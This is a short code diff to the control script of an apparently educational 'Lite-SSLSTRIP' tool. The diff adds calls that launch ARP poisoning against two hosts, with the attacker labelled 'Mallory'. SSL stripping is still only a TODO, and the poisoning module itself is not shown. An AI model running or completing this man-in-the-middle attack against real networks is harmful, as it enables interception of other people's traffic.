@@ -1,5 +1,10 @@
+## Main contorl script of the Lite-SSLSTRIP too
+## Reads user input and
+## launches the ARP-poisoning and SSL strip
+
 # TODO horrible intro ASCII art
 import argparse
+from arppoison import ArpPoison
 
 # Commandline arguments for ARP-spoofing
 parser = argparse.ArgumentParser()
@@ -15,7 +20,9 @@ parser.add_argument('ipM', help="IP address of you (Mallory)")
 args = parser.parse_args()
 print args.macA
 
-# TODO Launch ARP attack
-
+# Launch ARP attack
+arp = ArpPoison(args.macA, args.ipA, args.macB, args.ipB, args.macM, args.ipM)
+arp.arpPoisonA()
+arp.arpPoisonB()
 
 # TODO include parameters for SSL stripping
